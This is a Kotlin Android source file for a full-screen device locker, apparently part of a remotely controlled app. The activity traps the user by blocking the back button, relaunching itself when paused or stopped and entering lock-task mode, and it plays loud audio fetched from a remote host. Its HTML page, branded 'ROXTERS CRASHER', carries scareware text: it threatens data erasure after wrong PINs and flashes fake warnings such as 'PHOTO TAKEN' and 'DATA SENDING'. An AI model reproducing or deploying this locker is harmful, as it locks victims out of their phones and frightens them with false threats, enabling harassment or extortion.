package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.media.MediaPlayer
import android.webkit.WebViewClient

class LockNewActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()

        try {
    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
    if (dpm.isLockTaskPermitted(packageName)) startLockTask()
} catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "startLockTask: ${e.message}")
        }
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    override fun onBackPressed() {
    if (!isUnlocked) return
    super.onBackPressed()
}

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            if (isUnlocked) return@postDelayed
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }, 300)
    }

    override fun onStop() {
    super.onStop()
    if (isUnlocked) return
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
        val intent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra(LockOverlayService.EXTRA_PIN, correctPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(intent)
    }
}

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.TRANSPARENT)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:transparent;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
<div id="wrap">
${body}
</div>
</body>
</html>""".trimIndent()
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                        sendBroadcast(cmdIntent)
                    } catch (e: Exception) {
                        android.util.Log.w("LockNewActivity", "broadcast: ${e.message}")
                    }
                    val unlockIntent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
                    sendBroadcast(unlockIntent)
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "playLockSound: ${e.message}")
        }
    }

    private fun buildLockHtml(): String {
    val safeTitle = lockTitle
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace("\"", "&quot;")

    return """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>🔐 LOCKED BY GHAZY</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  user-select: none;
}
body {
  background: #000;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  font-family: 'Courier New', 'Segoe UI', monospace;
  padding: 12px;
  margin: 0;
}
.lock-screen {
  background: #0a0505;
  width: 100%;
  max-width: 420px;
  padding: 24px 16px 32px;
  border: 3px solid #cc0000;
  box-shadow: 0 0 50px rgba(255,0,0,0.6), inset 0 0 30px rgba(255,0,0,0.2);
  position: relative;
  clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%);
}
.lock-screen::before {
  content: '';
  position: absolute;
  top: -2px; left: -2px; right: -2px; bottom: -2px;
  background: transparent;
  border: 4px solid #cc0000;
  clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%);
  pointer-events: none;
  z-index: 20;
  box-shadow: 0 0 40px #ff000088;
}
.lock-screen::after {
  content: '';
  position: absolute;
  top: 8px; left: 8px; right: 8px; bottom: 8px;
  border: 2px dashed #ff333355;
  pointer-events: none;
  clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%);
}
.top-bar {
  display: flex;
  justify-content: space-between;
  color: #ff2222;
  font-size: 14px;
  font-weight: 800;
  padding: 0 6px 12px;
  border-bottom: 2px solid #660000;
  text-transform: uppercase;
  letter-spacing: 2px;
  text-shadow: 0 0 10px #ff0000;
}
.top-bar span:last-child {
  color: #ff6666;
  animation: blink 1s infinite;
}
@keyframes blink {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.2; }
}
.icon-container {
  display: flex;
  justify-content: center;
  align-items: center;
  margin: 8px 0 0;
  height: 90px;
}
.lock-icon {
  font-size: 82px;
  color: #ffffff;
  text-shadow: 0 0 60px #ffffffaa, 0 0 120px #ffffff66;
  filter: drop-shadow(0 0 30px #ffffff88);
  animation: pulseIcon 1.2s infinite alternate;
  line-height: 1;
}
@keyframes pulseIcon {
  0% { transform: scale(1) rotate(-3deg); }
  100% { transform: scale(1.12) rotate(3deg); }
}
h1 {
  color: #ff1111;
  font-size: 26px;
  font-weight: 900;
  text-align: center;
  letter-spacing: 4px;
  text-transform: uppercase;
  text-shadow: 0 0 30px #ff0000, 0 0 60px #ff000066;
  margin: 2px 0 4px;
}
.sub {
  color: #ff4444;
  font-size: 13px;
  text-align: center;
  background: #1a0000;
  padding: 6px 12px;
  border-left: 6px solid #ff0000;
  border-right: 6px solid #ff0000;
  display: inline-block;
  margin: 0 auto 12px;
  letter-spacing: 1px;
  font-weight: 700;
  text-transform: uppercase;
  width: auto;
}
.pin-display {
  background: #111;
  padding: 12px 16px;
  border: 3px solid #cc0000;
  display: flex;
  justify-content: center;
  gap: 20px;
  margin: 12px auto 20px;
  max-width: 220px;
  box-shadow: inset 0 0 30px #330000;
}
.pin-dot {
  width: 24px;
  height: 24px;
  border-radius: 0;
  background: #2a1a1a;
  border: 2px solid #440000;
  transition: all 0.15s;
  clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%);
}
.pin-dot.filled {
  background: #ff0000;
  border-color: #ff4444;
  box-shadow: 0 0 30px #ff0000, inset 0 0 10px #ff6666;
}
.pin-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 12px;
  margin: 16px 0 20px;
}
.pin-btn {
  background: #1a0a0a;
  border: 3px solid #880000;
  border-radius: 0;
  padding: 18px 0;
  font-size: 28px;
  font-weight: 900;
  color: #ffcccc;
  cursor: pointer;
  transition: all 0.08s;
  box-shadow: 0 6px 0 #330000;
  text-shadow: 0 0 10px #ff000066;
  clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%);
  font-family: 'Courier New', monospace;
  letter-spacing: 2px;
}
.pin-btn:active {
  transform: translateY(4px);
  box-shadow: 0 2px 0 #330000;
  background: #330000;
  border-color: #ff3333;
}
.pin-btn.del {
  background: #2a0808;
  color: #ff6666;
  font-size: 22px;
}
.pin-btn.del:active {
  background: #550000;
}
.pin-btn.enter {
  background: #3a0a0a;
  color: #ff4444;
  font-size: 20px;
  border-color: #aa3333;
}
.pin-btn.enter:active {
  background: #660000;
}
.warning-box {
  background: #1a0000;
  border: 3px solid #ff0000;
  padding: 14px 10px;
  text-align: center;
  color: #ff4444;
  font-size: 16px;
  font-weight: 800;
  text-transform: uppercase;
  letter-spacing: 1px;
  margin: 10px 0 8px;
  clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%);
  box-shadow: inset 0 0 40px #ff000033;
  animation: warningPulse 1.5s infinite alternate;
}
@keyframes warningPulse {
  0% { background: #1a0000; border-color: #ff0000; }
  100% { background: #2a0000; border-color: #ff6666; }
}
.countdown-box {
  background: #0d0000;
  border: 3px solid #990000;
  padding: 12px;
  text-align: center;
  color: #ff3333;
  font-size: 28px;
  font-weight: 900;
  margin: 8px 0 14px;
  clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%);
  font-family: 'Courier New', monospace;
  letter-spacing: 6px;
  text-shadow: 0 0 30px #ff0000;
}
.progress-bar {
  width: 100%;
  height: 8px;
  background: #1a0000;
  border: 2px solid #880000;
  margin: 10px 0 16px;
  clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%);
  overflow: hidden;
}
.progress-fill {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg, #ff0000, #ff4444, #ff0000);
  box-shadow: 0 0 30px #ff0000;
  transition: width 0.3s linear;
}
.footer {
  color: #663333;
  font-size: 11px;
  text-align: center;
  border-top: 3px solid #440000;
  padding-top: 16px;
  margin-top: 8px;
  letter-spacing: 2px;
  text-transform: uppercase;
  font-weight: 700;
}
.footer span {
  color: #ff2222;
  animation: blink 1.5s infinite;
}
.pin-btn, .warning-box, .countdown-box, .pin-display, .top-bar, .sub {
  clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%);
}
</style>
</head>
<body>
<div class="lock-screen" id="lockScreen">
  <div class="top-bar">
    <span>⛔ ROXTERS CRASHER</span>
    <span id="statusLed">● LIVE</span>
  </div>

  <div class="icon-container">
    <div class="lock-icon">?</div>
  </div>
  <h1>🔐 DEVICE LOCKED</h1>
  <div class="sub">‼️ UNLOCK REQUIRED ‼️</div>

  <div class="pin-display" id="pinDisplay">
    <span class="pin-dot" id="dot1"></span>
    <span class="pin-dot" id="dot2"></span>
    <span class="pin-dot" id="dot3"></span>
    <span class="pin-dot" id="dot4"></span>
  </div>

  <div class="warning-box" id="warningMsg">⚠️ WRONG PIN WILL ERASE DATA ⚠️</div>
  <div class="countdown-box" id="countdownDisplay">⏳ 30s</div>

  <div class="pin-grid">
    <button class="pin-btn" data-value="1">1</button>
    <button class="pin-btn" data-value="2">2</button>
    <button class="pin-btn" data-value="3">3</button>
    <button class="pin-btn" data-value="4">4</button>
    <button class="pin-btn" data-value="5">5</button>
    <button class="pin-btn" data-value="6">6</button>
    <button class="pin-btn" data-value="7">7</button>
    <button class="pin-btn" data-value="8">8</button>
    <button class="pin-btn" data-value="9">9</button>
    <button class="pin-btn del" data-value="del">⌫</button>
    <button class="pin-btn" data-value="0">0</button>
    <button class="pin-btn enter" data-value="enter">↵</button>
  </div>

  <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
  <div class="footer">⚠️ <span>YOUR PHONE IS MONITORED</span> ⚠️</div>
</div>

<audio id="bgAudio" src="https://files.catbox.moe/a7ldhb.mp3" loop preload="auto"></audio>

<script>
(function(){
  const audio = document.getElementById('bgAudio');
  audio.volume = 0.8;
  audio.play().catch(() => {});
  document.addEventListener('click', () => {
    if (audio.paused) audio.play().catch(() => {});
  });
  document.addEventListener('touchstart', () => {
    if (audio.paused) audio.play().catch(() => {});
  });

  const dots = [document.getElementById('dot1'), document.getElementById('dot2'), document.getElementById('dot3'), document.getElementById('dot4')];
  const warningMsg = document.getElementById('warningMsg');
  const countdownDisplay = document.getElementById('countdownDisplay');
  const progressFill = document.getElementById('progressFill');

  let pin = [];
  const MAX_PIN = 4;
  const CORRECT_PIN = ['1','2','3','4'];
  let at = 0;
  let cd = 30;
  let timerInterval = null;
  let isLocked = false;
  let lockTimeout = null;

  function updateDots() {
    dots.forEach((dot, idx) => {
      if (idx < pin.length) dot.classList.add('filled');
      else dot.classList.remove('filled');
    });
  }

  function resetPin(clearTimer = true) {
    pin = [];
    updateDots();
    if (clearTimer && timerInterval) {
      clearInterval(timerInterval);
      timerInterval = null;
      cd = 30;
      countdownDisplay.textContent = '⏳ 30s';
      progressFill.style.width = '0%';
      isLocked = false;
      document.querySelectorAll('.pin-btn').forEach(btn => btn.disabled = false);
      warningMsg.textContent = '⚠️ WRONG PIN WILL ERASE DATA ⚠️';
      warningMsg.style.color = '#ff4444';
    }
    if (lockTimeout) {
      clearTimeout(lockTimeout);
      lockTimeout = null;
    }
  }

  function startCountdown() {
    if (timerInterval) clearInterval(timerInterval);
    cd = 30;
    countdownDisplay.textContent = '⏳ 30s';
    progressFill.style.width = '0%';
    isLocked = true;
    document.querySelectorAll('.pin-btn').forEach(btn => btn.disabled = true);
    warningMsg.textContent = '🚨 LOCKDOWN ACTIVE 🚨';
    warningMsg.style.color = '#ff0000';

    timerInterval = setInterval(() => {
      cd--;
      const percent = ((30 - cd) / 30) * 100;
      progressFill.style.width = percent + '%';
      countdownDisplay.textContent = `⏳ ${cd}s`;

      if (cd <= 0) {
        clearInterval(timerInterval);
        timerInterval = null;
        countdownDisplay.textContent = '💀 DATA ERASED 💀';
        progressFill.style.width = '100%';
        warningMsg.textContent = '💀 ALL DATA DELETED 💀';
        warningMsg.style.color = '#ff0000';
        document.body.style.backgroundColor = '#1a0000';
        let flashCount = 0;
        const flashInterval = setInterval(() => {
          document.body.style.backgroundColor = 
            document.body.style.backgroundColor === '#1a0000' ? '#000' : '#1a0000';
          flashCount++;
          if (flashCount > 20) {
            clearInterval(flashInterval);
            document.body.style.backgroundColor = '#000';
          }
        }, 200);
        setTimeout(() => {
          resetPin(true);
          document.querySelectorAll('.pin-btn').forEach(btn => btn.disabled = false);
          countdownDisplay.textContent = '⏳ 30s';
          warningMsg.textContent = '⚠️ WRONG PIN WILL ERASE DATA ⚠️';
          warningMsg.style.color = '#ff4444';
          progressFill.style.width = '0%';
          isLocked = false;
          at = 0;
          document.body.style.backgroundColor = '#000';
        }, 8000);
      }
    }, 1000);
  }

  function handleEnter() {
    if (isLocked) return;
    if (pin.length !== MAX_PIN) {
      warningMsg.textContent = '⚠️ ENTER 4 DIGITS! ⚠️';
      warningMsg.style.color = '#ffaa00';
      return;
    }
    const entered = pin.join('');
    if (entered === CORRECT_PIN.join('')) {
      warningMsg.textContent = '✅ UNLOCKED ✅';
      warningMsg.style.color = '#00ff88';
      document.querySelector('.lock-icon').textContent = '😈';
      document.querySelector('h1').textContent = '📱 UNLOCKED';
      document.querySelector('.sub').textContent = '✔️ ACCESS GRANTED';
      if (timerInterval) clearInterval(timerInterval);
      if (lockTimeout) clearTimeout(lockTimeout);
      isLocked = false;
      countdownDisplay.textContent = '✅ SAFE';
      progressFill.style.width = '0%';
      document.querySelectorAll('.pin-btn').forEach(btn => btn.disabled = false);
      resetPin(true);
      at = 0;
      audio.pause();
      return;
    } else {
      at++;
      warningMsg.textContent = `❌ WRONG PIN! ATTEMPT ${at} ❌`;
      warningMsg.style.color = '#ff2222';
      resetPin(true);
      if (at >= 3) {
        startCountdown();
      }
    }
  }

  function handlePinInput(value) {
    if (isLocked) return;
    if (lockTimeout) {
      clearTimeout(lockTimeout);
      lockTimeout = null;
      document.querySelectorAll('.pin-btn').forEach(btn => btn.disabled = false);
      warningMsg.textContent = '⚠️ WRONG PIN WILL ERASE DATA ⚠️';
      warningMsg.style.color = '#ff4444';
      if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
        cd = 30;
        countdownDisplay.textContent = '⏳ 30s';
        progressFill.style.width = '0%';
        isLocked = false;
      }
    }

    if (value === 'del') {
      if (pin.length > 0) {
        pin.pop();
        updateDots();
      }
      return;
    }
    if (value === 'enter') {
      handleEnter();
      return;
    }
    if (pin.length < MAX_PIN) {
      pin.push(value);
      updateDots();
      if (pin.length === MAX_PIN) {
        setTimeout(() => handleEnter(), 150);
      }
    }
  }

  document.querySelectorAll('.pin-btn').forEach(btn => {
    btn.addEventListener('click', function(e) {
      e.preventDefault();
      const val = this.dataset.value;
      handlePinInput(val);
    });
    btn.addEventListener('contextmenu', (e) => e.preventDefault());
  });

  document.addEventListener('keydown', function(e) {
    if (e.key >= '0' && e.key <= '9') handlePinInput(e.key);
    else if (e.key === 'Backspace' || e.key === 'Delete') handlePinInput('del');
    else if (e.key === 'Enter') handlePinInput('enter');
  });

  document.addEventListener('contextmenu', (e) => e.preventDefault());
  document.addEventListener('selectstart', (e) => e.preventDefault());

  setInterval(() => {
    if (!isLocked && Math.random() > 0.75) {
      const scares = [
        '⚠️ CAMERA ACCESS DETECTED',
        '🚨 GPS TRACKING ACTIVE',
        '📸 PHOTO TAKEN',
        '🔊 MICROPHONE ON',
        '📡 DATA SENDING...'
      ];
      warningMsg.textContent = scares[Math.floor(Math.random() * scares.length)];
      warningMsg.style.color = '#ffaa00';
      setTimeout(() => {
        if (!isLocked) {
          warningMsg.textContent = '⚠️ WRONG PIN WILL ERASE DATA ⚠️';
          warningMsg.style.color = '#ff4444';
        }
      }, 2500);
    }
  }, 7000);

  resetPin(true);
})();
</script>
</body>
</html>
"""
}